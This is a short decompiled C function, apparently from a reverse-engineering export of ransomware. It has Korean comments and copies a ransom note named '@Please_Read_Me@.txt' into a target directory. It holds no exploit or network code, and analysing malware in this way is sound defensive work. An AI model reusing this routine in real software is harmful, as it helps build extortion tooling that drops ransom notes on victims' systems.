// --- Metadata ---
// Function Name: CopyReadMeFileToPath_10003200
// Address: 0x10003200
// Exported At: 20250522_175757
// Signature: unknown_signature
// ---------------
BOOL __stdcall CopyReadMeFileToPath_10003200(wchar_t *targetDir)
{
  wchar_t Buffer[360]; // [esp+0h] [ebp-2D0h] BYREF

  swprintf(Buffer, (const size_t)L"%s\\%s", targetDir, L"@Please_Read_Me@.txt");// 경로와 파일명 합치기 
  return CopyFileW(L"@Please_Read_Me@.txt", Buffer, 1);// 파일 복사 
}
